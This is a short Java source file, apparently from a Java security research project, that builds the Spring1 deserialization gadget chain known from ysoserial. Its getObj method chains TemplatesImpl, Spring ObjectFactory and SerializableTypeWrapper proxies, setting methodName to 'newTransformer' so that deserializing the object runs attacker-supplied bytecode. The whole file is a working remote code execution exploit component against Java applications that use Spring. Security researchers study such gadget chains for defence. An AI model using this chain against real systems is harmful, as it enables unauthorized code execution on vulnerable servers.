package com.pacemrc.javasec.Gadgets;

import com.pacemrc.javasec.tools.ysoserial.Gadgets;
import com.pacemrc.javasec.tools.ysoserial.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import static java.lang.Class.forName;

public class Spring1 {

    public static Object getObj(Class<?> cls) throws Exception {

        TemplatesImpl templates = Payload.getTemplatesImpl(cls);

        ObjectFactory objectFactoryProxy =
                Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);

        Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)
                Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
                        .newInstance(objectFactoryProxy), Type.class, Templates.class);

        Object typeProviderProxy = Gadgets.createMemoitizedProxy(
                Gadgets.createMap("getType", typeTemplatesProxy),
                forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

        Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
        Reflections.setFieldValue(mitp, "methodName", "newTransformer");

        return mitp;
    }

}
